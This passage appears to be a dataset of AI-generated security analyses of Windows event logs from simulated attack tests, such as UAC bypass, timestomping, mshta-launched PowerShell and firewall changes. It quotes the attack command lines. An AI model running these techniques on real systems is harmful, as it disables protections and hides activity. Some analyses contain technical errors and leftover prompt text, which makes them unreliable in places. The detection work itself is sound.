- The alteration of Terminal Server registry settings (`reg add`) for session management is unconventional and should be critically evaluated.
- Time modification could imply malicious intent to obscure actions.
- The elevated privileges (`SeDebugPrivilege`, etc.) obtained should be justified and verified with legitimate administrative activity.

### Resolution:

- **SUSPICIOUS**: The activities observed are unusual and warrant further investigation to ensure they align with authorized administrative activities. It is essential to verify these actions with known maintenance schedules or expected remote management activities and confirm with administrators whether they were intentional and legitimate. Additionally, further review of server configuration, logs, and enhanced monitoring should be implemented until activities are deemed benign or justified."
CheckIfInstallable method call,"Based on the analysis of the provided logs, here's the detailed assessment of the situation:

### Suspicious Activity:
1. **PowerShell Activity**:
   - There are multiple PowerShell commands being executed by the user `SERVER002\admin_test`. The command involves the invocation of a test function `Invoke-BuildAndInvokeInstallUtilAssembly` from a script located in a temporary directory. The script is trying to compile and execute .NET assemblies, which is often seen in scenarios involving unwanted operations like code execution or malware activity.
   - The PowerShell command-line arguments appear obfuscated and elaborate, indicating an attempt to possibly execute or test compiled code (e.g., `data.004.dll`) dynamically. This behavior is often associated with malicious intent.
   
2. **Frequent Use of `wevtutil.exe` and Other System Tools**:
   - Tools like `wevtutil.exe` are legitimate but powerful tools that can be misused for clearing event logs or extracting log information unauthorized. The frequent invocation of such utility in the logs can be part of an attempt to cover tracks or manipulate event logs.

3. **Use of .NET Compiler**:
   - The `csc.exe`, which is the Visual C# Command Line Compiler, is used to compile C# code dynamically. This is a technique used during certain types of cyber-attacks where payloads are dynamically compiled and executed on the target machine.

4. **Execution of Tools from Temporary Directory**:
   - Processes such as `MicrosoftEdgeUpdate.exe` being executed from temporary folders and consistent updates are appearing unusual, given the rapid and intense nature of process execution in this case. There may be a normal update activity, but combined with the PowerShell activity and use of temporary directories, it marks it as suspicious.

### Assessment:
- The combination of unusual PowerShell script execution, frequent use of `wevtutil.exe` and system tools, and Dynamic .NET compilation through `csc.exe` indicates a high probability of attempted or successful unauthorized activity.
- These patterns align with common tactics used in malware or pen-test scenarios which involve privilege escalation and execution of unauthorized code.

### Conclusion and Guidance:
- **Resolution: SUSPICIOUS** - The logs present enough unusual activity that suggests potential compromise or at least activity requiring further investigation.
  
### Recommendations:
1. **Immediate Containment**: Isolate the machine (Server002) from the network to prevent any potential lateral movement or data exfiltration.
2. **Forensic Analysis**: Conduct a deeper investigation on Users (especially `SERVER002\admin_test`) and correlate with other security-relevant logs or alerts.
3. **Review Temporary Directory Usage**: Particularly focus on the scripts and executables in `C:\Users\admin_test\Documents\` and `C:\Users\ADMIN_~1\AppData\Local\Temp\`.
4. **Monitor for Similar Activity**: Enhance monitoring on potentially affected systems and user accounts for similar behavior.
5. **Patching and Security Updates**: Ensure that all security updates and patches are applied to prevent exploitation of known vulnerabilities.
6. **Conduct a Threat Hunt**: Investigate for indicators of compromise across the network to assess if this activity correlates with broader incidents or attack campaigns.

It's essential to handle this investigation with priority, given the indicators present."
Allow SMB and RDP on Microsoft Defender Firewall,"Upon reviewing the provided Windows event logs, several important observations can be made:

1. **Process Execution and User Privilege:**
   - Multiple instances of common Windows utilities (`wevtutil.exe`, `conhost.exe`, and `cmd.exe`) are being executed under the user `SERVER002\admin_test` with high integrity level. This user seems to have elevated privileges.
   - Notably, the command line executed by `cmd.exe` includes:
     ```
     ""cmd.exe"" /c netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes & netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes
     ```
     This command explicitly modifies the Windows firewall to allow ""Remote Desktop"" and ""File and Printer Sharing,"" which is a potential red flag for unauthorized access attempts or lateral movement.

2. **Windows Event Logs (SysMon and Others):**
   - Repeated operations using `wevtutil.exe` often indicate interactions with Windows event logs. This might suggest that the logs are being queried or altered, a typical step for both legitimate administration and malicious actors seeking to cover their tracks.
   - Regular processes like `hostname.exe` and `whoami.exe` are being used, likely as reconnaissance steps to gather information about the host and network environment.

3. **Time Discrepancies:**
   - There is a series of event logs related to changes in system time, handled by `svchost.exe`. Although there could be benign reasons for this, such as time synchronization issues, it's worth noting that discrepancies in system time changes could also be used to confuse log timestamps during an intrusion.

4. **Other Activity:**
   - The logs include entries indicating normal operations and updates of Microsoft Edge Update services, which are expected in regular system maintenance but warrant verification as this activity can sometimes be mimicked or misused by malicious software utilizing legitimate services as a cover.

**Assessment and Recommendation:**

The activity observed in the logs, particularly the deliberate modification of firewall rules and the use of system utilities that can interact with log files, network settings, and user session details, are strong indicators of potentially suspicious or unauthorized behavior. However, without contextual information (e.g., operational changes during that period), it's challenging to definitively classify the activity as malicious without further investigation.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a more detailed investigation into the `admin_test` account's recent activity, checking for any anomalous behavior outside of these logs.
- Correlate these findings with network logs and any alerts from intrusion detection systems.
- Confirm whether there have been any scheduled or unscheduled administrative changes involving the firewall and system time.
- Ensure that the system has not been compromised by scanning for potential backdoors or persistence mechanisms.
- If unauthorized changes are confirmed, consider isolating the host and reviewing all privileged accounts and their activities for further signs of compromise."
attrib - Remove read-only attribute,"Upon analyzing the provided Windows event logs, a sequence of activities can be observed that preempts potentially suspicious behavior. Below is the detailed analysis.

### Analysis of Potentially Suspicious Behavior:

1. **Repeated Execution of `cmd.exe` with Complex Commands**:
   - Multiple occurrences of `cmd.exe` executions performing tasks like directory creation, file creation, and the use of `attrib.exe` to change file attributes. For example:
     - Creating directories and files using command lines involving `mkdir` and `echo`.
     - Utilizing `attrib.exe` to change file attributes to read-only.
   - This could indicate the presence of a script performing automated operations. The command-line usage does not directly indicate malware but is often seen in automation tasks or script execution.

2. **Unexpected Execution of `wevtutil.exe`**:
   - Multiple instances of `wevtutil.exe` without clear context or detailed arguments. This utility is used to manage event logs, and such activity may indicate attempts to alter log data for anti-forensics purposes, but no definitive evidence of such activities is present here.

3. **Execution of Microsoft Edge Update and Associated Components**:
   - Several entries for `MicrosoftEdgeUpdate.exe` and its components (`MicrosoftEdgeUpdateSetup.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`) running with `NT AUTHORITY\SYSTEM` privileges. These seem related to a legitimate update process, showing regular software maintenance behavior.

4. **Execution of Windows Session Manager Provider Host (wsmprovhost.exe)**:
   - The parent process for some `cmd.exe` executions, indicating a potential remote PowerShell session or another form of remote management task execution. This could be legitimate, but without additional context, remote execution by system administrators.

5. **Common Administrative Utilities Usage**:
   - `whoami.exe` and `HOSTNAME.EXE` observed. These are usually non-malicious and are used for various scripting or administrative processes.

### Assessment of the Logs:

- **Legitimate Process Executions**: Many logs show system update or maintenance tasks, particularly related to Microsoft Edge Update processes executed by `NT AUTHORITY\SYSTEM`. This indicates regular software management activity.

- **Potential Automation/Script Execution**: Activity involving multiple executions of `cmd.exe` with automated scripts is common in administrative or task scheduler activities. However, in unusual contexts, they can be used maliciously.

- **Lack of Clear Malicious Evidence**: Without supporting data indicating unauthorized access, execution of known malicious processes, or connections to external malicious command and control servers, the logs do not conclusively demonstrate malicious activity.

### Resolution:

Based on the analysis, the logs do not contain explicit evidence of malicious activities; however, certain aspects are slightly unusual and may warrant a mild level of suspicion due to the unexplained use of `wevtutil.exe` and some scripting-like activities. However, these elements are potentially associated with legitimate system administration or automated tasks without clear indications of compromise:

**Resolution**: SUSPICIOUS

### Guidance:

- **Further Investigation**: Conduct a deeper investigation into the context of `cmd.exe` and `wevtutil.exe` usage. Verify with system administrators if the activities align with scheduled tasks or maintenance scripts.
  
- **Monitoring**: Continue to monitor the system for any new unusual process execution or further unexplained activities that could help provide additional context or evidence of unauthorized actions.

- **Environment Control**: Ensure that security tools are adequately deployed and configured to detect any deviations from usual administrative task executions which may indicate an insider threat or misuse of administrative privileges."
Windows HideSCAVolume Group Policy Feature,"Upon analyzing the provided event logs from the Windows machine, the following observations are made:

### System Log:
- The logs show time synchronization events involving `svchost.exe`, which is a normal system process handling various services including Windows Time Service. The time adjustments appear minor and likely related to regular system operations.

### Sysmon Log:
- The execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. `wevtutil.exe` is typically used for managing event logs and `conhost.exe` is part of the console windows infrastructure, both generally benign unless used in a suspicious context.
- The notable entry involves `cmd.exe` executing a registry modification command (`reg add`) to hide the system volume control applet. This could potentially indicate malicious activity aimed at user experience alteration, indicating a need for closer examination.
- Following normal executions of `MicrosoftEdgeUpdate.exe`, which is consistent with legitimate update processes for Microsoft Edge.

### Application Log:
- The application log entries relate to the Edge Update service stopping, which corresponds with the execution of `MicrosoftEdgeUpdate.exe` in the Sysmon logs, suggesting routine update activities.

### Security Log:
- Displays logon and privilege assignment events for the user `admin_test` with elevated privileges (including `SeDebugPrivilege`). The granted privileges are significant and could be misused if assigned to a non-legitimate user or process.
- Logon events involving NTLM authentication, albeit common in environments using NTLM, can sometimes indicate lateral movement or pass-the-hash attacks if not properly secured, but there's no concrete evidence of misuse in the logs provided.

### Assessment:
The overall activity, except for the registry modification, appears to be part of typical system and application operations. The registry change executed through `cmd.exe` to hide `SCAVolume` without clear justification is suspicious and should be investigated further to understand its purpose and intent.

### Resolution:
- **SUSPICIOUS** - The registry modification warrants further investigation to determine if it is part of legitimate administration activity or a potential compromise attempt. Ensure that the involved user's activity is verified and cross-checked against known tasks, and examine whether this change aligns with authorized IT operations or deployment scripts. Further network and endpoint monitoring for any related anomalous behavior is recommended."
Disable UAC using reg.exe,"### Detailed Analysis and Assessment

**Suspicious and Anomalous Activities:**

1. **Time Change Events:**
   - Several events (EventID 4616 in Security log and EventID 1 in System log) indicate that the system time was modified multiple times within a very short interval. This can be indicative of attempts to manipulate time-based security controls or cover tracks by altering log timestamps.

2. **Registry Modification Command:**
   - In the Sysmon log (EventID 1), there is a command executed via `cmd.exe` that runs `reg.exe` to alter the UAC settings: `EnableLUA` is set to `""0""`, which effectively disables User Account Control. This action could indicate an attempt to lower security settings for malicious purposes.

3. **Execution of Common Windows Tools:**
   - Multiple `wevtutil.exe` and `conhost.exe` executions by a user `SERVER002\admin_test` in Sysmon logs. While these tools are legitimate, their usage should be justified, especially because event utility `wevtutil.exe` is often used in post-exploitation activities for log editing or wiping.

4. **High Integrity Level Processes:**
   - Several processes, including `whoami.exe` and `hostname.exe`, are executed at High Integrity Level by the `admin_test` user. These executions are not necessarily malicious but should be contextualized with user activities, especially if performed without the knowledge of administrators.

5. **Multiple `MicrosoftEdgeUpdate.exe` Executions:**
   - Numerous executions of `MicrosoftEdgeUpdate.exe` across the logs with various command-line arguments (`/svc`, `/update`, `/c`). It appears continuous, automated, and potentially benign as part of an update mechanism, but the excessive frequency could warrant further investigation if any anomalies or unauthorized updates are suspected.

**Potential Indicators of Malicious Activity:**

- **Registry Edit (UAC Disable):** The alteration to disable User Account Control (UAC) is of significant concern and aligns with common tactics used by malware to maintain persistence or elevate privileges without user consent.
  
- **Time Manipulation:** The time changes, especially if not intentional or without a clear administrative purpose, suggest potential log manipulation.

### Risk Assessment and Recommendations

- **Resolution: MALICIOUS**

The presence of the `reg.exe` command to disable UAC combined with unexplained time changes strongly suggests a compromise or an attempt at one. The use of administrative tools by non-recognized patterns or objectives strengthens this assessment.

**Recommended Actions:**

1. **Immediate Remediation:**
   - Re-enable UAC (`EnableLUA`=1) and monitor any security configuration changes made in the registry.
   - Ensure system time synchronization to prevent further unauthorized changes.

2. **Conduct a Detailed Root Cause Analysis:**
   - Investigate if these actions were performed with authorized knowledge and if they align with legitimate business processes. If not, they need immediate scrutiny.

3. **Enhanced Monitoring:**
   - Increase verbosity of logging, especially around process creation events and any commands altering system security settings.
   - Correlate with threat intelligence for potential matches with known malicious tooling or campaigns.

4. **Engage Incident Response Team:**
   - Review user access logs, especially for `admin_test`, and evaluate for any unauthorized or suspicious activities over the period in concern.
   - Potentially isolate the system and conduct a wider network audit to ascertain whether additional systems exhibit similar indicators of compromise.

By following the above recommendations, the risk posed by this activity can be mitigated effectively."
UACME Bypass Method 61,"Upon analyzing the provided event logs, I have identified some entries that warrant further investigation due to potentially suspicious or unusual activity. Let's break down the findings:

1. **Sysmon Log Analysis:**

   - Execution of the `cmd.exe` with the command line containing: 
     ```
     ""C:\Windows\system32\cmd.exe"" /c echo C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\uacme\61 Akagi64.exe
     ```
     and subsequently:
     ```
     ""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\uacme\61 Akagi64.exe""
     ```
     These actions indicate possible usage of UACMe (User Account Control bypass technique), which is used for privilege escalation. The presence of `uacme` and `Akagi64.exe` suggests an attempt at performing unauthorized privilege escalation.

   - Execution of various system-level utilities (like `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and `wermgr.exe`) around the same timeframe might suggest reconnaissance or an attempt to gather system-specific information.

2. **Windows Security Log Analysis:**

   - Elevated privileges were observed through Security Log Event ID 4672 which was logged multiple times indicating Special Privileges were assigned (e.g., SeDebugPrivilege). Repeated granting of such privileges can be suspicious, especially soon after potential privilege escalation attempts.

3. **Application Logs:**

   - Application logs indicate that Windows Defender was active, noted by:
     ```
     Windows Defender, SECURITY_PRODUCT_STATE_ON
     ```
     However, no alerts or actions from Windows Defender regarding the suspicious activity were recorded in the provided logs.

**Assessment:**

- **Suspicious Activity:** 
  - The use of `uacme` for a potential privilege escalation attempt and the sequence of unusual command executions suggest behavior commonly associated with lateral movement or initial access phases of a cyberattack.
  - Elevated privileges and repeated invocations of system utilities further the suspicion of unauthorized activities, possibly indicative of an attacker’s attempt to maintain persistence or further exploit the system.

**Resolution: SUSPICIOUS**

While there is no direct evidence of successful exploitation or data exfiltration, the combination of events suggests that further investigation is warranted. The activities point towards potentially suspicious behavior that could indicate an early-stage attack or security configuration issues on the host.

**Guidance on Next Steps:**

1. **Isolate the System:** Temporarily isolate the affected system to prevent potential lateral movement.
   
2. **In-depth Investigation:** Conduct a detailed forensic investigation, focusing on the execution paths of suspicious processes and the integrity of critical system files.

3. **Security Posture Review:** Ensure that all security software, including anti-malware solutions like Windows Defender, is fully operational and updated.

4. **Privileged Access Audit:** Review user accounts and privileges, especially focusing on accounts that have recently received elevated privileges.

5. **Log Monitoring and Threat Intelligence:** Increase monitoring on this system and leverage threat intelligence to check for known IOCs (Indicators of Compromise) related to the events observed.

These steps can help ascertain whether the suspicious behavior aligns with an active threat and mitigate potential risks to the broader network."
Execute base64-encoded PowerShell from Windows Registry,"Upon reviewing the provided logs, the following analysis and insights can be presented:

### Summary of Findings:

1. **PowerShell Activity**:
   - The PowerShell logs demonstrate the execution of a suspicious command: a script that encodes a command into Base64, stores it in the Windows Registry, and then decodes and executes it (IEX - Invoke-Expression command). This type of behavior is commonly associated with attempts to obfuscate malicious scripts, often seen in malware to evade detection.
   
2. **Sysmon Events**:
   - There are several executions of processes related to standard Windows utilities such as `whoami.exe`, `wevtutil.exe`, `hostname.exe`, and `powershell.exe`. While these processes can be benign, their executions in conjunction with the encoded PowerShell command suggest potentially malicious intent.
   - Notably, the PowerShell scripts executed via `IEX` showcase common tactics employed in attack scenarios, like downloading or executing malicious payloads via obfuscated scripts.

3. **Security and System Logs**:
   - The system logs indicate regular system activities and updates; however, combining this information with the PowerShell activities highlights potential misuse.
   - The security logs show logon activities consistent with expected behavior for system operations, but no direct indicators of a specific compromise were seen outside of the context provided by the PowerShell events.

4. **Windows Defender State**:
   - The logs show Windows Defender being operational during these events. However, there is no record of alerts or blocks related to the executed suspicious commands, indicating potential evasion of detections in place.

### Assessment:

The combination of storing a Base64-encoded PowerShell command in the registry and invoking it using `IEX` marks a potential compromise tactic, as it is characteristic of many known threats and malware families that seek to obfuscate their activity.

### Resolution: **MALICIOUS**

The analyzed PowerShell activities are definitive indicators of malicious behavior, considering the proven practices of obfuscation and execution via registry-stored Base64 strings. This is a classic tactic used to bypass defense systems, including antivirus and endpoint protection solutions.

### Guidance:

1. **Immediate Actions**:
   - Isolate the affected system to prevent potential lateral movement within the network.
   - Conduct a full malware scan and review any executed processes following the PowerShell activities.

2. **Further Investigation**:
   - Examine the registry and filesystem for any additional persistent scripts or modified entries.
   - Check network logs for any unusual outbound connections that coincide with these times.

3. **Review and Strengthen Security Measures**:
   - Enable enhanced logging, such as deeper PowerShell script block logging, to capture suspicious activity.
   - Regularly update and configure security tools to recognize and block obfuscated command execution patterns.

Implement these steps to address the identified malicious activity effectively and prevent future occurrences."
Bypass UAC using Event Viewer (PowerShell),"Upon analyzing the provided Windows event logs, certain activities stand out that suggest potential malicious behavior. Here are the findings:

1. **PowerShell Script Execution (Sysmon & PowerShell Logs)**:
   - The execution of `powershell.exe` with a suspicious command line that involves modifying registry keys under `HKCU:\software\classes\mscfile\shell\open\command\` and then launching `eventvwr.msc` suggests a potential attempt to exploit the system. This pattern is commonly associated with a privilege escalation technique where `eventvwr.exe` is used to bypass User Account Control (UAC).
   - Sysmon EventID 1 logs reveal a `powershell.exe` command run from a temporary directory, modifying registry entries (`HKCU:\software\...`) which can lead to execution of an alternate `cmd.exe` upon opening of certain files.

2. **Excessive Use of System Utilities (Sysmon Logs)**:
   - Multiple instances of system utilities like `wevtutil.exe` and `conhost.exe` are executed in quick succession. While these might be normal under certain circumstances, coupled with the above PowerShell activity, they can indicate attempts to clear logs or execute shell commands stealthily.

3. **Security Events (Security Logs)**:
   - Multiple logon events for the user `admin_test` with high privileges and the presence of sensitive privileges like `SeDebugPrivilege` and `SeBackupPrivilege` are recorded. This could indicate unauthorized privilege escalation or lateral movement within the system.
   - The sequences of 4624 (An account was successfully logged on) and 4672 (Special privileges assigned to new logon) events in rapid succession suggest potentially unauthorized administrative access.

4. **Time Change Events (System Logs)**:
   - There are events related to time changes (`EventID 1`, `Kernel-General Logs`) which can sometimes be indicative of attempts to modify time to spoof logs or cover tracks.

5. **EdgeUpdate Executions (Application Logs)**:
   - Numerous EdgeUpdate executions are observed. While potential updates are possible, the frequency and timing (alongside suspicious behavior above) raise concern. Most of these processes are executed by `NT AUTHORITY\SYSTEM`, which indicates system-level permissions were utilized.

### Assessment:
Based on the above analysis, the logs present evidence of potentially **malicious** activity characterized by:
- Suspected privilege escalation using PowerShell to manipulate Registry keys, indicative of an attacker's attempt to escalate privileges without triggering User Account Control (UAC) prompts.
- High privilege user activities with potentially malicious intent.
- Pattern and behavior consistent with known malicious techniques (abuse of `eventvwr.exe`, registry changes for persistence).

### Recommendation:
1. **Immediate Response**:
   - Isolate the affected system `Server002` to prevent further spread and execution of potentially harmful commands.
   - Conduct a full forensic analysis of the system, including memory and disk to confirm the presence of any backdoors or unauthorized access tools left by the attacker.
   - Audit logs specifically for other abnormal access patterns or connections to external IP addresses.

2. **Long-term Actions**:
   - Review and tighten administrative access policies and ensure Principle of Least Privilege (POLP) is applied effectively.
   - Enhance monitoring and alerting for the same pattern of PowerShell scripts execution and registry edits.
   - Conduct regular security training for administrators and users to recognize abnormal behaviors and potential attacks.

Finalize your finding into ONE of the three resolutions:
- **MALICIOUS** - The logs contain activities that strongly indicate malicious behaviors, warranting immediate and thorough investigation and remediation."
Mshta used to Execute PowerShell,"### Analysis of Windows Event Logs

#### Summary
The provided Sysmon, System, Application, Windows PowerShell, and Security logs for the Windows host named ""Server002"" contain various events. Anomalous and potentially suspicious activities were identified, particularly involving the execution of commands through `cmd.exe`, `mshta.exe`, and `powershell.exe`.

#### Key Observations

1. **Execution of Suspicious Commands:**
   - The `cmd.exe` process (PID: 3756) was used to execute a command involving `mshta.exe`. The command executed was:
     ```
     ""cmd.exe"" /c mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run%%20""""powershell.exe%%20-nop%%20-Command%%20Write-Host%%20Hello,%%20MSHTA!;Start-Sleep%%20-Seconds%%205""""""))</script>'""
     ```
   - This command constructs and executes a VBScript using `mshta.exe` to run a PowerShell command (`powershell.exe -nop -Command Write-Host Hello, MSHTA!; Start-Sleep -Seconds 5`). The use of `mshta.exe` with embedded scripts is a well-known technique for payload delivery and command execution often observed in malicious activities.

2. **Multiple Related Processes:**
   - `mshta.exe` (PID: 4248) was executed under the command `mshta.exe ""about:<hta:application>...""`.
   - `powershell.exe` (PID: 4840) was then executed with flags that suppress profiles and output (`-nop`) and executed a script (`-Command Write-Host Hello, MSHTA!; Start-Sleep -Seconds 5`).

3. **High Integrity Level:**
   - Processes executed under high integrity levels indicate they have elevated privileges, which can be exploited to perform unauthorized actions on the system.

4. **Time Change Events:**
   - The system time was altered, which coincides with common tactics to evade log monitoring based on timestamps. Events within this context include:
     - Both System and Security logs recorded time changes:
       - `OldTime` from 2024-10-26 14:34:52 to `NewTime` 2024-10-26 14:34:45.

5. **Frequent Use of `conhost.exe`:**
   - Multiple `conhost.exe` processes were spawned, which is typical but can be leveraged to conceal malicious console outputs.

#### Assessment

The activity observed in these logs is indicative of **MALICIOUS** behavior. The use of VBScript executed via `mshta.exe` to run PowerShell commands is a recognized method for carrying out remote code execution or downloading malicious payloads. Moreover, the modification of system time further suggests attempts to obfuscate activity.

#### Recommendations

1. **Immediate Actions:**
   - Isolate the affected system from the network to prevent further propagation or data exfiltration.
   - Initiate a detailed forensic analysis to identify the full extent of the breach.
   - Reset credentials for users who have accessed or executed processes on the host, specifically focusing on the `admin_test` account.

2. **Long-term Actions:**
   - Implement application whitelisting to prevent unauthorized execution of `mshta.exe` and other scripting hosts.
   - Establish stricter monitoring of PowerShell scripts and command-line executions.
   - Review and tighten access privileges to minimize potential attack vectors.

This analysis suggests that thorough remediation and investigation into the malicious activity are critical to secure the environment effectively."
Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,"### Analysis of Event Logs

#### Overview:

Upon reviewing the Windows event logs, specifically focusing on Sysmon, Windows PowerShell, and command execution logs, there are several indicators of potentially suspicious behavior. Here's a detailed breakdown:

#### Potentially Suspicious Activities:

1. **PowerShell Execution**:
   - Multiple instances of PowerShell are initiated by the user `SERVER002\admin_test`. Notably, one of these instances includes a complex command: 
     ```powershell
     powershell.exe & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\system32\mshta.exe}
     ```
     - This activity is suspicious because it uses PowerShell to invoke an HTA application with lateral movement simulation, often seen in penetration testing or malware activities. The use of `mshta.exe` further indicates an unusual operation, possibly attempting code execution or download execution via HTML Application (HTA).

2. **Process Execution**:
   - Frequent execution of `wevtutil.exe` and `conhost.exe` by the same user. While `conhost.exe` can be benign, frequent and closely timed executions, especially following `wevtutil`, could point toward potential clearing or tampering with event logs.

3. **Command-Line Execution**:
   - Use of `HOSTNAME.EXE` and `whoami.exe` consecutively may be part of routine administrative checks. However, in context with combined PowerShell usage patterns, it poses a question about intent and whether an administrative script or task sequence is running unexpectedly.

#### Indicators of Malicious Patterns:

- **PowerShell Scripting and Execution Behavior**:
  - The command-line PowerShell operations involving script execution with HTA files and the use of `mshta.exe` as seen here are common in malicious scripting to bypass standard application control policies and execute payloads.
  
- **Command Execution Similar to Penetration Techniques**:
  - The scripting appears intents of lateral movement simulation, which aligns with adversary simulation or intra-network movement, often not routine in benign network operations.

#### Recommendations:

1. **Immediate Analysis Action**:
   - Conduct a deeper investigation into the `SERVER002\admin_test` user's actions and the purpose of the PowerShell script mentioned.
   - Confirm the legitimacy and necessity of the `Invoke-ATHHTMLApplication` script and any related scripts that may not have been directly captured in these logs.
   
2. **Security Measures**:
   - Use endpoint security tools to trace the origin of the PowerShell command and its intended execution purpose.
   - Verify any unusual alterations in system tasks or scripts that could automate such PowerShell calls at runtime.

3. **Mitigation and Remediation**:
   - Consider isolating the host for a thorough forensic evaluation and ensure all valid administrative scripts and automated tasks are whitelisted in authorized baseline checks.
   - Implement stricter monitoring or restriction of PowerShell execution policies and logging to detect unusually elevated or unexpected administrative actions.

### Conclusion:

**Resolution**: **MALICIOUS**

Despite some logs containing potentially benign activity, the PowerShell script's nature in context and its interactions suggest potential misuse for lateral movements or further understanding of the environment for escalation, fitting deeper into suspicious to malicious activity patterns commonly seen in malware attacks. Immediate follow-up actions are recommended to confirm and mitigate possible compromise."
Compiled HTML Help Local Payload,"Upon analyzing the provided Windows event logs, the following observations were made with regards to potential indicators of malicious activity:

### Security Logs:
1. **Event ID 4624**: This event signifies a successful logon. There are two instances of interest:
   - Logon Type 5 for ""SYSTEM"" using ""Advapi"" (expected for service logons).
   - Logon Type 3 for user ""admin_test"" from an IPv6 address. Logon type 3 is for network logons which can be normal, but when combined with suspicious behavior, needs further scrutiny.

2. **Event ID 4672**: Special privileges assigned:
   - High privileges like SeDebugPrivilege, SeTakeOwnershipPrivilege, and SeImpersonatePrivilege were assigned to ""admin_test."" This elevation of privileges is critical to note, particularly if the account ""admin_test"" should not normally receive such high-level privileges.

3. **Event ID 4634**: A logoff event for ""admin_test"" with Logon Type 3 - normal post-login activity, but corroborates the network connections.

### Sysmon Logs:
1. **Execution of PowerShell (Event ID 5)**:
   - The execution of PowerShell (`powershell.exe`) under user ""admin_test"" suggests potential malicious use, especially when PowerShell is often utilized for administrative and automation purposes that attackers leverage.

2. **Command line executions**:
   - The execution of `cmd.exe` with `hh.exe` pointing to a .chm file in a temp directory can be malicious if not usual for this server. .chm files can be used for help documentation but might also contain malicious payloads.
   - The presence of Conhost.exe and Wevtutil.exe could be benign, yet their rapid successive executions with privileges might reflect command execution or event log manipulations.

3. **Suspicious Use of Wevtutil**:
   - Multiple instances of Wevtutil.exe execution under ""admin_test"" are notable because this utility can be used to clear event logs, potentially covering tracks.

4. **Various Executable Activities Related to Microsoft Edge Update**:
   - Extensive activity involving `MicrosoftEdgeUpdate.exe` processes could be part of a legitimate update process but needs validation from software update schedules. Attackers sometimes disguise malicious activity under software update operations.

### No Potential Threats Observed in Application and System Logs:
- These logs did not present any overt indicators of compromise or suspicious activity.

### Conclusion & Recommendation:
The presence of multiple PowerShell, CMD, and potentially suspicious Wevtutil executions, combined with the elevated privileges of a possibly unsanctioned user, ""admin_test,"" demands attention.

- **Resolution**: **SUSPICIOUS**

This activity warrants further investigation. Key recommendations include:
- Verify ""admin_test"" account's role and activities.
- Review scheduled tasks and update logs to confirm legitimate update operations.
- Analyze PowerShell script execution history for potential unauthorized scripts.
- Perform network analysis for unusual traffic patterns concerning the user ""admin_test.""
- Consider applying tighter privilege controls and logging for PowerShell usage. 

Proceed with caution, and possibly enhance threat detection measures if these activities do not align with known operational baselines."
Windows - Modify file creation timestamp with PowerShell,"### Analysis of the Logs:

#### Suspicious or Anomalous Behavior:

1. **Time Stamp Manipulation:**
   - There is a PowerShell script running with a command to change a file's creation time to ""01/01/1970 00:00:00"". This indicates timestomping, which is a technique commonly used by attackers to alter the timestamps of files to evade detection or establish a false narrative of timeline events.

   - EventID 1 under Sysmon includes a PowerShell execution with the command:
     ```
     ""powershell.exe"" & {Get-ChildItem \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.006_timestomp.txt\"" | %% { $_.CreationTime = \""01/01/1970 00:00:00\"" }}
     ```
   
2. **Presence of Wevtutil and Conhost Processes:**
   - `wevtutil` is a command-line utility that can be used to retrieve information about event logs and publishers, install and uninstall event manifests, and more. Its invocation in this context can indicate attempts to access or clear event logs.
   - Multiple `conhost.exe` instances do not inherently appear malicious, but combined with other suspicious activities, it can indicate attempts to manipulate consoles and execute hidden commands.

3. **Anomalous PowerShell Activity:**
   - Multiple occurrences of PowerShell processes executed by ""SERVER002\\admin_test"" align with the file timestamp manipulation observed in the logs.
   - The usage of a high-integrity level during these operations suggests that they were executed with elevated privileges which an attacker might use to manipulate sensitive system settings or files.

#### Potential Malicious Events Identified:

- The execution of PowerShell with a timestomping command strongly suggests malicious intent given that timestomping is a known tactic used by attackers to cover their tracks by altering file metadata.
- The series of `wevtutil.exe` executions can be suspicious, especially if tied to a possible clearing of event logs to erase traces of malicious activities.

### Final Assessment:

**Resolution: MALICIOUS**

Based on the evidence from the logs, particularly the use of a PowerShell script for timestomping and the suspicious processes involving `wevtutil.exe`, the activity appears to be malicious. The altering of file timestamps signifies a deliberate attempt to manipulate evidence on the system, a hallmark of compromise tactics.

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Isolate the affected host Server002 from the network to prevent further potential exfiltration or spread of malicious activity.

2. **Forensic Investigation:**
   - Perform a full forensic analysis of the system to identify all affected files and potential persistence mechanisms established by the attacker.

3. **Log Review and Monitoring:**
   - Review additional logs (not provided) such as firewall logs, IDS/IPS alerts, and network traffic logs around the event times for any signs of data exfiltration or lateral movement.
   - Implement stricter monitoring for unusual PowerShell activities and serve commands on critical systems.

4. **Clean-up and Remediation:**
   - Remove any tools or scripts executed by the attacker.
   - Ensure any exploited vulnerabilities or weaknesses are addressed, such as implementing stricter PowerShell execution policies and least-privilege access principles.

5. **Awareness and Training:**
   - Train users on recognizing phishing attempts or unauthorized scripts which might have led to the compromised credentials used in the logs.

6. **System Hardening:**
   - Strengthen the security posture of all critical servers by ensuring they have up-to-date security patches and hardened configurations."
Odbcconf.exe - Load Response File,"After carefully analyzing the provided Windows event logs, here are the findings regarding potentially suspicious or malicious activities:

### Detailed Analysis:
1. **Event 4799 in Security Log**: Indicates a process associated with Microsoft Edge Update Installer running under SYSTEM privileges. This is a typical operation seen in software updates and does not inherently indicate malicious activity.

2. **Event 4624 and 4672 in Security Log**: These events detail logons by `SERVER002$` and `admin_test` user accounts, along with high-level privileges granted to `admin_test`. The use of `SeDebugPrivilege` and similar privileges can be standard for administrative tasks but are also potentially risky if associated with unauthorized actions. However, the mere presence of this event doesn't prove malicious intent.

3. **Sysmon Log Entries for PowerShell and Process Execution**:
